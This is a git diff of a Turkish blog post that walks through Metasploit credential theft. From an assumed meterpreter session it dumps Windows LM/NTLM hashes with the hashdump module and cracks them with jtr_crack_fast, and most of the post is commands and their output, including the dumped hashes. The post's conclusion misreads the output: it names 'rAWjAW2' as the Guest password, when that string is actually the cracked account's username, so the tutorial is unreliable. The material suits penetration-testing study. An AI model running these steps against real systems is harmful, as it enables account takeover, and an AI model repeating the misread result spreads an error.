@@ -5,7 +5,7 @@ date: 2017-05-25 09:12:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,16 +13,20 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework client exploit
-- msf client side exploit
-excerpt: Bu yazımızda, Metasplot Framework kullanarak İstemci tarafı exploit olarak
-  bir PDF dosyası oluşturmayı göreceğiz. Oluşturulan PDF, görünürde zararsız olsa
-  da içerisine zararlı kodlar gömülebilir.
+- Metasploit Framework john the ripper
+- msf jtr_crack_fast
+excerpt: John The Ripper programı, karmaşık algoritmalı parolaları çözmek için kullanılan bir programdır. Bir takım kelime listelerini kullanarak hash olarak kaydedilmiş kodları çözmeye çalışır. 
 ---
 
-John the Ripper
-The John The Ripper module uses to identify weak passwords that have been acquired as hashed files (loot) or raw LANMAN/NTLM hashes (hashdump). The goal of this module is to find trivial passwords in a short amount of time. To crack complex passwords or use large wordlists, John the Ripper should be used outside of Metasploit. This initial version just handles LM/NTLM credentials from hashdump and uses the standard wordlist and rules.
+# John the Ripper
 
+John The Ripper programı, karmaşık algoritmalı parolaları çözmek için kullanılan bir programdır. Bir takım kelime listelerini kullanarak hash olarak kaydedilmiş kodları çözmeye çalışır. 
+
+Metasploit içerisinde de John The Ripper kullanabilirsiniz. Burada kullanılacak John the Ripper, basit algoritmalarla ilgilenir. Çok karmaşık ve ileri düzey hash kodları için Metasploit dışında çalışmanız gerektiğini belirtelim. Metasploit içindeki John the Ripper, sadece LM veya NTLM hash kodlarını çözmek için başlangıç düzeyinde işlem yapmanıza yarar. Bir örnekle görelim.
+
+Öncelikle hedef bilgisayarda meterpreter oturum açtığımızı kabul ediyoruz. ```session 1``` olarak aktif halde olan oturum için ```post/windows/gather/hashdump``` modülünü aktif hale getirip hash bilgilerini alalım.
+
+```sh
 msf auxiliary(handler) > use post/windows/gather/hashdump
 msf post(hashdump) > set session 1
 session => 1
@@ -45,7 +49,11 @@ rAWjAW2:1004:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c::
 
 
 [*] Post module execution completed
+```
 
+Hash bilgilerini ekranda görebilirsiniz. Şimdi ```auxiliary/analyze/jtr_crack_fast``` modülünü kullanalım.
+
+```sh
 msf post(hashdump) > use auxiliary/analyze/jtr_crack_fast
 msf auxiliary(jtr_crack_fast) > run
 
@@ -81,7 +89,11 @@ Use the "--show" option to display all of the cracked passwords reliably
 guesses: 0  time: 0:00:00:00 DONE (Sat Jul 16 19:59:27 2011)  c/s: 7407K  trying: 89030 - 89092
 [*] Output: Loaded 6 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
 [*] Output: Remaining 4 password hashes with no different salts
+
 [+] Cracked: Guest: (192.168.184.134:445)
 [+] Cracked: rAWjAW2:password (192.168.184.134:445)
 [*] Auxiliary module execution completed
 msf auxiliary(jtr_crack_fast) >
+```
+
+Görüldüğü gibi ```192.168.184.134``` IP adresinde ```Guest``` kullanıcısı için parola ```rAWjAW2``` olarak bulundu.
